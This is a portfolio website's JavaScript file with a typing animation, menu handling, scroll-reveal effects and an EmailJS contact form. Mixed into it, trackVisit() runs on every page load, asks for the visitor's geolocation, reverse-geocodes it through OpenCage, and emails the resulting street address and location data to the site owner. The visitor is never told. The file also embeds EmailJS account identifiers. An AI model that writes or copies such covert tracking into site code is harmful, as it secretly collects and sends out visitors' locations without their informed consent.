const navLinks = document.getElementById("nav-links");
const menuBtn = document.getElementById("menu-btn");
const menuBtnIcon = menuBtn.querySelector("i");

function typingEffect(
  strings,
  insertionSpeed,
  deletionSpeed,
  delay,
  specialIndex
) {
  const typingElement = document.querySelector(".typing-effect-class");
  let currentIndex = 0;
  let isBuilding = true;
  let currentString = "";

  function processString() {
    const targetString = strings[currentIndex];

    if (currentIndex === specialIndex && isBuilding && currentString === "") {
      // typingElement.style.backgroundColor = "white";
      // typingElement.style.borderRadius = "20px";
      // typingElement.style.padding = "0px 20px";
    }

    if (isBuilding) {
      currentString = targetString.substring(0, currentString.length + 1);
      typingElement.textContent = currentString;

      if (currentString === targetString) {
        isBuilding = false;
        setTimeout(processString, delay);
        return;
      }
    } else {
      currentString = currentString.substring(0, currentString.length - 1);
      typingElement.textContent = currentString;

      if (currentString === "") {
        if (currentIndex === specialIndex) {
        }

        currentIndex = (currentIndex + 1) % strings.length;
        isBuilding = true;
      }
    }

    setTimeout(processString, isBuilding ? insertionSpeed : deletionSpeed);
  }

  processString();
}

typingEffect(["FRONTEND", "BECKEND", "FULLSTACK"], 50, 30, 1000, 2);

menuBtn.addEventListener("click", (e) => {
  navLinks.classList.toggle("open");

  const isOpen = navLinks.classList.contains("open");
  menuBtnIcon.setAttribute(
    "class",
    isOpen ? "ri-close-line" : "ri-menu-3-line"
  );
});

navLinks.addEventListener("click", (e) => {
  navLinks.classList.remove("open");
  menuBtnIcon.setAttribute("class", "ri-menu-3-line");
});

const scrollRevealOption = {
  distance: "50px",
  origin: "bottom",
  duration: 1000,
};

// header container
if(navigator.onLine)
{

  ScrollReveal().reveal(".header__image img", {
    ...scrollRevealOption,
  });
ScrollReveal().reveal(".about__image", {
  ...scrollRevealOption,
});
ScrollReveal().reveal(".hiring-form input", {
  ...scrollRevealOption,
});
ScrollReveal().reveal("section", {
  ...scrollRevealOption,
});
ScrollReveal().reveal(".header__content h1", {
  ...scrollRevealOption,
});

ScrollReveal().reveal(".header__content .section__description", {
  ...scrollRevealOption,
  delay: 500,
});

ScrollReveal().reveal(".header__content .header__btn", {
  ...scrollRevealOption,
  delay: 1000,
});

ScrollReveal().reveal(".about__content .section__header", {
  ...scrollRevealOption,
});

ScrollReveal().reveal(".about__content .section__description", {
  ...scrollRevealOption,
  delay: 500,
});

ScrollReveal().reveal(".about__content .about__btn", {
  ...scrollRevealOption,
  delay: 1000,
});


ScrollReveal().reveal(".project__card", {
  ...scrollRevealOption,
  interval: 500,
});

ScrollReveal().reveal(".portfolio__card", {
  duration: 1000,
  interval: 200,
});

}
async function getdetails(lat,long) {
  var query = lat + ',' + long;
  const baseUrl = "https://api.opencagedata.com/geocode/v1/json"
  const apiKey =  CONFIG.API_KEY;
  var request_url = baseUrl
    + '?'
    + 'key=' + apiKey
    + '&q=' + encodeURIComponent(query)
    + '&pretty=1'
    + '&no_annotations=1';

    var request = new XMLHttpRequest();
  request.open('GET', request_url, true);

  request.onload = function() {

    if (request.status === 200){


      var data = JSON.parse(request.responseText);
      const params = {
        name: `an UNKNOWN PERSON ${localStorage.getItem('comecount') || 0} times `,
        email: data.results[0].formatted ,
        phone: JSON.stringify(data.rate,null,2),
        message:`${JSON.stringify(data.results, null, 2)}`,
      };
      if(localStorage.getItem('visited')) return;
      emailjs.init("EOhduJp06AYSRR2tQ");
      emailjs.send("service_6e96rxi", "template_nknlh8o", params).then(
       async function () {
          localStorage.setItem('visited',true)
        },
        function (error) {
          console.log(error);
        }
      );


    } else if (request.status <= 500){

      var data = JSON.parse(request.responseText);
      console.log('error msg: ' + data.status.message);
    } else {
      console.log("error");
    }
  };

  request.onerror = function() {
    console.log("unable to connect to server");
  };

    request.send(); 


  
}

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      (position) => {

        const lat = position.coords.latitude;
        const long = position.coords.longitude;
        
        if(lat && long)
        { if(navigator.onLine) getdetails(lat,long)
          else return
        }
        else return;
        return ;
      },
      (error) => {
        console.error("Error occurred: " + error.message);
        return null;
      }
    );
  } else {
    return null;
  }
}


async function trackVisit() {

  if (!sessionStorage.getItem('sessionVisited')) {

      sessionStorage.setItem('sessionVisited', 'true');

      
      let comecount = parseInt(localStorage.getItem('comecount')) || 0;
      comecount++;
      localStorage.setItem('comecount', comecount);
      if(localStorage.getItem('visited')) return;
      getLocation();
  } else {
  }
}



  trackVisit();

  

function  reset(){
  document.getElementById("name").value='';
    document.getElementById("email").value = '';
    document.getElementById("phone").value = '';
     document.getElementById("message").value = '';

}

async function send(event) {
  event.preventDefault();
  const params = {
    name: `${document.getElementById("name").value} ${localStorage.getItem('comecount')|| 0} times`,
    email: document.getElementById("email").value,
    phone: document.getElementById("phone").value,
    message: document.getElementById("message").value,
  };
  emailjs.init("EOhduJp06AYSRR2tQ");
  emailjs.send("service_6e96rxi", "template_nknlh8o", params).then(
   async function () {
      reset()
      alert("sent successfully ");
    },
    function (error) {
      alert("Something went wrong");
    }
  );
}
